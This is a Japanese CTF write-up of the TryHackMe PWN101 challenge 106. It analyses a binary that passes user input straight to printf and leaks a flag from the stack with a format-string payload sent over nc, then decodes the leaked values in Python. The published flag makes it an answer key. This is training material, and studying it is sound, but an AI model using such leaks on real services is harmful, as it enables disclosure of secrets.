---
title: TryHackMe PWN101 Writeup (6) PWN106
pubDatetime: 2026-04-26
description: TryHackMe PWN101 Challenge 6のWriteup
tags: [TryHackMe, Writeup, Pwn]
draft: false
---

## file

PIE

```shellsession
$ file pwn106-user-1644300441063.pwn106-user
pwn106-user-1644300441063.pwn106-user: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=60a1dfa10c02bcc6d113cb752053893ac9e2f4f1, for GNU/Linux 3.2.0, not stripped
```

## checksec

Canary

```shellsession
$ .venv/bin/pwn checksec pwn106-user-1644300441063.pwn106-user
[*] '/home/hat0uma/work/pwn106-user-1644300441063.pwn106-user'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

## 実行

なんかお祝いしてくれる

```shellsession
$ ./pwn106-user-1644300441063.pwn106-user
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 107

🎉 THM Giveaway 🎉

Enter your THM username to participate in the giveaway: abc

Thanks abc
```

## Ghidra

BOFはぱっと見無い(local_48[56]に対して50文字のread)
ただ読み込んだやつを直接printfに渡してるので書式文字列攻撃ができそう。

```c
void main(void)
{
  long in_FS_OFFSET;
  char local_48 [56];
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  banner();
  puts(&DAT_00102119);
  printf("Enter your THM username to participate in the giveaway: ");
  read(0,local_48,0x32);
  printf("\nThanks ");
  printf(local_48);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

pwndbgで覗いてみたらスタックの先頭になんかフラグっぽいものがある。

```
─────────────────────────────────────────────────────────────────────────
pwndbg> c
Continuing.
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 107

🎉 THM Giveaway 🎉

Enter your THM username to participate in the giveaway: %x

Thanks
Breakpoint 2, 0x00005555555552fb in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────[ LAST SIGNAL ]─────────────────────────────
Breakpoint hit at 0x5555555552fb
─────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────
*RAX  0
 RBX  0x7fffffffe478 —▸ 0x7fffffffe7a7 ◂— '/home/hat0uma/work/pwn106-user-1644300441063.pwn106-user'
*RCX  0
*RDX  0
*RDI  0x7fffffffe310 ◂— 0xa7825 /* '%x\n' */
*RSI  0x7fffffffe140 ◂— '\nThanks '
*R8   8
 R9   0x7ffff7fca380 (_dl_fini) ◂— endbr64
*R10  0x7ffff7c109d8 ◂— 0x11001200001bd3
*R11  0x202
 R12  1
 R13  0
 R14  0
 R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
 RBP  0x7fffffffe350 —▸ 0x7fffffffe3f0 —▸ 0x7fffffffe450 ◂— 0
 RSP  0x7fffffffe2f0 ◂— 'THM{XXX[flag_redacted]XXX}'
*RIP  0x5555555552fb (main+189) ◂— call printf@plt
──────────────────[ DISASM / x86-64 / set emulate on ]───────────────────
 ► 0x5555555552fb <main+189>             call   printf@plt
   <printf@plt>
        format: 0x7fffffffe310 ◂— 0xa7825 /* '%x\n' */
        rsi: 0x7fffffffe140 ◂— '\nThanks '

   0x555555555300 <main+194>             nop
   0x555555555301 <main+195>             mov    rax, qword ptr [rbp - 8]
   0x555555555305 <main+199>             sub    rax, qword ptr fs:[0x28]
   0x55555555530e <main+208>             je     main+215
   <main+215>

   0x555555555310 <main+210>             call   __stack_chk_fail@plt
   <__stack_chk_fail@plt>

   0x555555555315 <main+215>             leave
   0x555555555316 <main+216>             ret

   0x555555555317                        nop    word ptr [rax + rax]
   0x555555555320 <__libc_csu_init>      push   r15
   0x555555555322 <__libc_csu_init+2>    lea    r15, [rip + 0x2abf]
R15 => 0x555555557de8 (__init_array_start) —▸ 0x555555555170 (frame_dummy) ◂— endbr64
────────────────────────────────[ STACK ]────────────────────────────────
00:0000│ rsp 0x7fffffffe2f0 ◂— 'THM{XXX[flag_redacted]XXX}'
01:0008│-058 0x7fffffffe2f8 ◂— 'flag_redacted]XXX}'
02:0010│-050 0x7fffffffe300 ◂— 'acted]XXX}'
03:0018│-048 0x7fffffffe308 ◂— 0x7d58 /* 'X}' */
04:0020│ rdi 0x7fffffffe310 ◂— 0xa7825 /* '%x\n' */
05:0028│-038 0x7fffffffe318 ◂— 0
... ↓        2 skipped
──────────────────────────────[ BACKTRACE ]──────────────────────────────
 ► 0   0x5555555552fb main+189
   1   0x7ffff7c2a1ca __libc_start_call_main+122
   2   0x7ffff7c2a28b __libc_start_main+139
   3   0x5555555550ba _start+42
─────────────────────────────────────────────────────────────────────────
```

x64なのでスタックを見るために第7引数以降($6～)を%pで出力する。

```shellsession
root@ip-10-144-107-4:~# nc 10.144.129.186 9006
       \u250c\u252c\u2510\u252c\u2500\u2510\u252c \u252c\u252c \u252c\u250c\u2500\u2510\u250c\u2500\u2510\u252c\u250c\u2500\u250c\u252c\u2510\u250c\u2500\u2510
        \u2502 \u251c\u252c\u2518\u2514\u252c\u2518\u251c\u2500\u2524\u251c\u2500\u2524\u2502  \u251c\u2534\u2510\u2502\u2502\u2502\u251c\u2524
        \u2534 \u2534\u2514\u2500 \u2534 \u2534 \u2534\u2534 \u2534\u2514\u2500\u2518\u2534 \u2534\u2534 \u2534\u2514\u2500\u2518
                 pwn 107

\U0001f389 THM Giveaway \U0001f389

Enter your THM username to participate in the giveaway: %6$p,%7$p,%8$p,%9$p,%10$p,%11$p,%12$p

Thanks 0x5f5530797b4d4854,0x5f3368745f6e3077,0x5961774133766947,0x3168745f446e615f,0x756f595f73315f73,0x7d47346c665f52,0x2437252c70243625
```

```python
pieces = [
    0x5F5530797B4D4854,
    0x5F3368745F6E3077,
    0x5961774133766947,
    0x3168745F446E615F,
    0x756F595F73315F73,
    0x7D47346C665F52,
    0x2437252C70243625,
]
flag = b""
for piece in pieces:
    flag += piece.to_bytes(8, "little")
print(flag)
# > b'THM{y0U_w0n_th3_Giv3AwaY_anD_th1s_1s_YouR_fl4G}\x00%6$p,%7$'
```

## 補足

ディスアセンブリのほうをよく見たらスタックを0x60(96)バイト取ってる。
その先頭のほう（local_4e）以降で文字列を作ってる。
デコンパイラ出力のほうだけ見てると、60バイトの配列しかないのでちょっと混乱した。
直接使ってないからデコンパイル出力からは消えたと思われる。

```disassembly

        00101264 e8 98 ff        CALL       banner                                           undefined banner()
                 ff ff
        00101269 48 b8 54        MOV        RAX,0x5b5858587b4d4854
                 48 4d 7b
                 58 58 58 5b
        00101273 48 ba 66        MOV        RDX,0x6465725f67616c66
                 6c 61 67
                 5f 72 65 64
        0010127d 48 89 45 a0     MOV        qword ptr [RBP + local_68],RAX
        00101281 48 89 55 a8     MOV        qword ptr [RBP + local_60],RDX
        00101285 48 b8 61        MOV        RAX,0x58585d6465746361
                 63 74 65
                 64 5d 58 58
        0010128f 48 89 45 b0     MOV        qword ptr [RBP + local_58],RAX
        00101293 66 c7 45        MOV        word ptr [RBP + local_50],0x7d58
                 b8 58 7d
        00101299 c6 45 ba 00     MOV        byte ptr [RBP + local_4e],0x0
```
